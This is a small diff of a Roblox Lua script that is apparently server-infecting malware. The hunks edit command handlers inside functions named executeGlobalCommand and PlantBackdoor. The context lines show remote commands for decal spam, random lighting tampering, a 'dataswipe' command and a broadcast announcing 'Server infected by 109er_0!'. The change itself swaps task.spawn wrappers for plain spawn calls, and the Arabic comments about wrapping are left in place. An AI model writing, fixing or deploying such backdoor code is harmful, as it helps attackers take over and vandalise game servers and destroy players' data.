@@ -289,7 +289,7 @@ local function executeGlobalCommand(command)
             bv:Destroy()
         end
     elseif cmd == "decalspam" then
-        task.spawn(function() runDecalSpam() end)   -- تم التغليف لحل الخطأ
+        spawn(runDecalSpam)
     end
 end
 
@@ -654,7 +654,7 @@ local function PlantBackdoor()
             elseif cmd == "color" then
                 Lighting.ColorCorrection.TintColor = Color3.new(math.random(), math.random(), math.random())
             elseif cmd == "decalspam" then
-                task.spawn(function() runDecalSpam() end)   -- تغليف لتجنب الخطأ
+                spawn(runDecalSpam)   -- تغليف لتجنب الخطأ
             elseif cmd == "announce" then
                 sendMessageToAll("[OMEGA] Server infected by 109er_0!")
             elseif cmd == "dataswipe" then
